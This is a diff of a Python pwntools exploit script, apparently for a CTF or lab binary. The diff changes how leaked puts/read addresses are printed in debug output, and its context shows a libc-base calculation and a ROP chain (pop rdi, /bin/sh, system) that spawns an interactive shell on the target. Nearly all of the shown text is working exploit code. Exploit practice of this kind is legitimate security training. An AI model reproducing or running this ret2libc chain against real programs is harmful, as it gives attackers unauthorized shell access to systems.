@@ -135,8 +135,8 @@ while (run):
 		putsAddr = p.recvline(keepends=False)
 		readAddr = p.recvline(keepends=False)
 
-		print(f"[DEBUG] Puts Address: {putsAddr.hex()}")
-		print(f"[DEBUG] Read Address: {readAddr.hex()}")
+		print(f"[DEBUG] Puts Address: {putsAddr[::-1].hex()}")
+		print(f"[DEBUG] Read Address: {readAddr[::-1].hex()}")
 
 		putsInt = int.from_bytes(putsAddr, 'little', signed=False)
 		libcBase = putsInt - 0x84420
@@ -157,7 +157,7 @@ while (run):
 		payload += p64(baseAddress + 0x1353) 	# ret to realign
 		payload += p64(libcBase + 0x1b45bd) 	# pop rdi; ret
 		payload += p64(baseAddress + 0x101a)	# Get address of /bin/sh into rdi
-		payload += p64(libcBase + 0x52290)		# Jump into system
+		payload += p64(libcBase + 0x52290)	# Jump into system
 		p.send(payload)
 		p.interactive()
 
